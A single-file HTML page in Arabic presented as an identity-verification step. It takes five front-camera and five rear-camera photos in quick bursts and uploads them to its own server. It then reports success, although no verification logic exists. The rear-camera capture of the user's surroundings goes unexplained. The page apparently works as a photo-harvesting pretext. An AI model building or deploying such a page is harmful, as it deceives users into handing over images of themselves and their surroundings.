<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>نظام التحقق</title>

<style>
*{box-sizing:border-box;margin:0;padding:0}

body{
    min-height:100vh;
    background:#0d0f14;
    color:#fff;
    font-family:system-ui,Tajawal,sans-serif;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:18px;
}

.card{
    width:100%;
    max-width:430px;
    background:#171a22;
    border:1px solid #292e3a;
    border-radius:22px;
    padding:18px;
    box-shadow:0 20px 60px #0008;
}

h1{
    font-size:22px;
    margin-bottom:7px;
}

.sub{
    color:#9299a8;
    font-size:13px;
    margin-bottom:15px;
}

.camera{
    position:relative;
    overflow:hidden;
    border-radius:17px;
    background:#000;
    aspect-ratio:16/9;
}

video{
    width:100%;
    height:100%;
    object-fit:cover;
    transform:scaleX(-1);
}

video.back{
    transform:none;
}

.progress{
    height:7px;
    background:#292e38;
    border-radius:99px;
    overflow:hidden;
    margin-top:15px;
}

.bar{
    height:100%;
    width:0%;
    background:#4f8cff;
    transition:width .15s linear;
}

.status{
    text-align:center;
    margin:13px 0;
    color:#aeb5c4;
    font-size:14px;
}

button{
    width:100%;
    border:0;
    border-radius:14px;
    padding:15px;
    background:#4f8cff;
    color:#fff;
    font-size:16px;
    font-weight:700;
}

button:disabled{
    opacity:.45;
}

.log{
    margin-top:12px;
    max-height:100px;
    overflow:auto;
    direction:ltr;
    text-align:left;
    font-size:11px;
    color:#747c8d;
}
</style>
</head>

<body>

<div class="card">

    <h1>🔐 التحقق من الهوية</h1>
    <div class="sub">
        سيتم استخدام الكاميرا بعد موافقتك لإتمام عملية التحقق.
    </div>

    <div class="camera">
        <video id="video" autoplay playsinline muted></video>
    </div>

    <div class="progress">
        <div class="bar" id="bar"></div>
    </div>

    <div class="status" id="status">
        اضغط «بدء التحقق»
    </div>

    <button id="start">
        بدء التحقق
    </button>

    <div class="log" id="log"></div>

</div>

<script>

const UPLOAD_URL = "/upload";

const video  = document.getElementById("video");
const start  = document.getElementById("start");
const status = document.getElementById("status");
const bar    = document.getElementById("bar");
const logBox = document.getElementById("log");

let stream = null;

function log(text){
    logBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${text}<br>`;
    logBox.scrollTop = logBox.scrollHeight;
}

function sleep(ms){
    return new Promise(r => setTimeout(r,ms));
}

/* فتح الكاميرا */
async function openCamera(facing){

    if(stream){
        stream.getTracks().forEach(t => t.stop());
    }

    stream = await navigator.mediaDevices.getUserMedia({
        video:{
            facingMode:{ideal:facing},
            width:{ideal:1280},
            height:{ideal:720}
        },
        audio:false
    });

    video.srcObject = stream;

    await new Promise(resolve => {
        if(video.readyState >= 2){
            resolve();
        }else{
            video.onloadedmetadata = resolve;
        }
    });

    video.classList.toggle(
        "back",
        facing === "environment"
    );

    await sleep(300);
}

/* التقاط JPEG */
function capture(){

    return new Promise(resolve => {

        const canvas = document.createElement("canvas");

        canvas.width  = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;

        const ctx = canvas.getContext("2d");

        if(!video.classList.contains("back")){
            ctx.translate(canvas.width,0);
            ctx.scale(-1,1);
        }

        ctx.drawImage(
            video,
            0,
            0,
            canvas.width,
            canvas.height
        );

        canvas.toBlob(
            blob => resolve(blob),
            "image/jpeg",
            .72
        );

    });
}

/* رفع الصورة للسيرفر */
async function upload(blob,index,total){

    const fd = new FormData();

    fd.append(
        "photo",
        blob,
        `verification_${index}.jpg`
    );

    fd.append("index",index);
    fd.append("total",total);

    const response = await fetch(
        UPLOAD_URL,
        {
            method:"POST",
            body:fd
        }
    );

    if(!response.ok){
        throw new Error(
            "HTTP " + response.status
        );
    }

    return response.json();
}

/* التشغيل */
async function run(){

    start.disabled = true;
    bar.style.width = "0%";
    logBox.innerHTML = "";

    const total = 10;

    try{

        status.textContent =
            "جاري تشغيل الكاميرا...";

        /*
         * نلتقط 5 صور أمامية
         */
        await openCamera("user");

        const front = [];

        for(let i=1;i<=5;i++){

            status.textContent =
                `📸 الصورة الأمامية ${i}/5`;

            const blob = await capture();

            front.push({
                blob,
                index:i
            });

            bar.style.width =
                ((i / total) * 50) + "%";

            await sleep(120);
        }

        /*
         * ثم 5 صور خلفية
         */
        await openCamera("environment");

        const back = [];

        for(let i=1;i<=5;i++){

            status.textContent =
                `📸 الصورة الخلفية ${i}/5`;

            const blob = await capture();

            back.push({
                blob,
                index:i+5
            });

            bar.style.width =
                (50 + (i / 10) * 50) + "%";

            await sleep(120);
        }

        /*
         * أوقف الكاميرا
         */
        if(stream){
            stream.getTracks().forEach(t => t.stop());
            stream = null;
        }

        status.textContent =
            "⬆️ جاري رفع الصور...";

        /*
         * رفع متوازي محدود
         * بدل انتظار كل صورة وحدها
         */
        const photos = [...front,...back];

        let completed = 0;

        const workers = 3;

        async function worker(){

            while(true){

                const item = photos.shift();

                if(!item) return;

                try{

                    await upload(
                        item.blob,
                        item.index,
                        total
                    );

                    completed++;

                    const percent =
                        50 +
                        (completed / total) * 50;

                    bar.style.width =
                        percent + "%";

                    log(
                        `uploaded ${item.index}/10`
                    );

                }catch(e){

                    log(
                        `upload error ${item.index}: ${e.message}`
                    );

                    throw e;
                }
            }
        }

        await Promise.all(
            Array.from(
                {length:workers},
                worker
            )
        );

        bar.style.width = "100%";

        status.innerHTML =
            "✅ <b>تم إكمال التحقق بنجاح</b>";

        start.textContent =
            "تم التحقق";

    }catch(error){

        console.error(error);

        status.textContent =
            "❌ حدث خطأ أثناء التحقق";

        log(error.message);

        start.disabled = false;
    }
}

start.addEventListener(
    "click",
    run
);

</script>

</body>
</html>
